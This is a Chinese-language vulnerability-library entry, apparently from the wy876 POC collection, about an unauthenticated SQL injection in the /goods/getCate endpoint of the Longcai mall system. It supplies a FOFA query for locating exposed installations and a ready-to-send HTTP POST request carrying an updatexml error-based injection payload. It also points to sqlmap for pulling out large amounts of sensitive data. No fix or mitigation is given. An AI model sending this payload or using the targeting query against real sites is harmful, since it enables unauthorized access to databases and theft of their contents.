---
fofa: "body="
source: "wy876 漏洞文库"
---

# 龙采商城系统后台/goods/getcate存在SQL注入

### 一、漏洞描述
龙采科技集团有限责任公司龙采商城系统后台/goods/getCate接口存在未授权SQL注入，可直接暴露出数据库敏感信息。

### 二、影响版本
龙采商城系统

### 三、资产测绘
FOFA：body="'url':'/pc2.0/index/index'"


### 四、漏洞复现
```plain
POST /goods/getCate HTTP/2
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 65

id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)&keyword=
```

使用burp请求POC即可暴出敏感数据库（也可以采用sqlmap跑出大量敏感信息）


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dyk2it32v9mtbdqw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
